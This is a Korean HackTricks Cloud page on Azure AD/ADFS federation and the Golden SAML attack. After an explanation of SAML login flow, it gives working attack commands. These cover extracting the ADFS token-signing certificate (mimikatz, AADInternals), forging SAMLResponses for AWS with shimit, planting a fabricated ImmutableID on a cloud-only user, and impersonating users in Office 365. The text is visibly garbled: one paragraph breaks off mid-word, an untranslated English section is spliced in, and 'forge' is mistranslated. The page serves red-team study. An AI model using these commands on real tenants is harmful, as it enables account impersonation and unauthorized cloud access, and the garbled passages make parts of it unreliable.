# 연합

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 정보

[문서에서 참조:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**연합**은 **신뢰**를 확립한 **도메인**의 모음입니다. 신뢰 수준은 다양할 수 있지만 일반적으로 **인증**을 포함하고 거의 항상 **인가**를 포함합니다. 일반적인 연합은 **공유 리소스에 대한 공유 액세스**를 위해 **신뢰**를 확립한 **여러 조직**을 포함할 수 있습니다.

온프레미스 환경을 Azure AD와 **연합**하여 인증 및 인가에 사용할 수 있습니다. 이 로그인 방법은 모든 사용자 **인증이 온프레미스에서 발생**함을 보장합니다. 이 방법을 사용하면 관리자가 더 엄격한 액세스 제어 수준을 구현할 수 있습니다. **AD FS** 및 PingFederate와의 연합이 가능합니다.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

기본적으로 연합에서는 모든 **인증**이 **온프레미스** 환경에서 발생하며 사용자는 신뢰할 수 있는 모든 환경에서 SSO를 경험합니다. 따라서 사용자는 **온프레미스 자격 증명**을 사용하여 **클라우드** 애플리케이션에 액세스할 수 있습니다.

**보안 주장 표시 언어 (SAML)**은 공급자 간에 인증 및 인가에 대한 모든 정보를 **교환**하는 데 사용됩니다.

연합 설정에는 세 가지 주체가 있습니다:

* 사용자 또는 클라이언트
* Identity Provider (IdP)
* Service Provider (SP)

(https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps에서 이미지 가져옴)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. 처음에는 사용자가 응용 프로그램 (AWS 콘솔 또는 vSphere 웹 클라이언트와 같은 Service Provider 또는 SP)에 액세스합니다. 구체적인 구현에 따라이 단계는 우회되어 클라이언트를 직접 IdP (Identity Provider)로 이동시킬 수 있습니다.
2. 그런 다음 SP는 사용자 인증을 위해 적절한 IdP (예: AD FS, Okta)를 식별합니다. 그런 다음 SP는 SAML (보안 주장 표시 언어) AuthnRequest를 작성하고 클라이언트를 선택한 IdP로 리디렉션합니다.
3. IdP가 인증을 수행하여 사용자를 인증합니다. 인증 후 IdP는 SAMLResponse를 작성하고 사용자를 통해 SP로 전달합니다.
4. 마지막으로 SP는 SAMLResponse를 평가합니다. IdP와의 신뢰 관계를 나타내는 성공적인 유효성 검사를 의미하면 사용자에게 액세스 권한이 부여됩니다. 이로써 로그인 프로세스가 완료되어 사용자가 서비스를 활용할 수 있게 됩니다.

**SAML 인증 및 일반적인 공격에 대해 더 알고 싶다면 다음으로 이동하세요:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## 피벗

* AD FS는 클레임 기반 신원 모델입니다.
* "..클레임은 주로 인터넷 어디에서든 클레임 기반 애플리케이션에 대한 액세스 권한을 인가하는 데 사용되는 사용자에 대한 선언문(예: 이름, 신원, 그룹)입니다."
* 사용자에 대한 클레임은 SAML 토큰 내에 작성되고 IdP에 의해 기밀성을 제공하기 위해 서명됩니다.
* 사용자는 ImmutableID에 의해 식별됩니다. 이는 전역적으로 고유하며 Azure AD에 저장됩니다.
* ImmutableID는 사용자의 GUID에서 파생될 수 있으며 사용자의 Azure AD에 대한 일관성 Guid로서 온프레미스에 저장됩니다.
* 자세한 내용은 [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)에서 확인할 수 있습니다.

**Golden SAML 공격:**

* ADFS에서 SAML 응답은 토큰 서명 인증서에 의해 서명됩니다.
* 인증서가 침해되면 Azure AD에 동기화된 **모든 사용자로 인증**할 수 있습니다!
* PTA 남용과 마찬가지로 사용자의 암호 변경이나 MFA는 어떤 영향도 미치지 않습니다. 왜냐하면 우리는 인증 응답을 위조하고 있기 때문입니다.
* 인증서는 DA 권한을 가진 AD FS 서버에서 추출한 다음 인터넷에 연결된 임의의 기기에서 사용할 수 있습니다.
* 자세한 내용은 [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)에서 확인할 수 있습니다.

### Golden SAML

**Identity Provider (IdP)**가 사용자 로그인을 승인하기 위해 **SAMLResponse**를 생성하는 프로세스는 매우 중요합니다. Id
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
모든 정보를 가지고 있으면 [**shimit**](https://github.com/cyberark/shimit)을 사용하여 피해자로 위장할 때 유효한 SAMLResponse를 잊을 수 있습니다:

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### 온프레미스 -> 클라우드
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
# Federation

## ImmutableID

Azure AD Connect uses the `ImmutableID` attribute to synchronize on-premises Active Directory (AD) users with cloud-only users in Azure AD. This attribute is used to establish a link between the on-premises user and the cloud-only user.

It is important to note that the `ImmutableID` attribute is not meant to be modified by users or administrators. However, as a hacker, you can exploit this attribute to impersonate cloud-only users.

By creating a new `ImmutableID` for a cloud-only user, you can establish a connection between the on-premises user and the cloud-only user. This allows you to impersonate the cloud-only user and gain unauthorized access to their resources.

To create a new `ImmutableID`, you can use various methods such as modifying the attribute directly in Azure AD or using PowerShell scripts. Once the new `ImmutableID` is set, you can use it to authenticate as the cloud-only user and perform lateral movement within the Azure AD environment.

It is important to note that this technique should only be used for ethical hacking purposes and with proper authorization. Unauthorized use of this technique can lead to legal consequences.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## 참고 자료

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
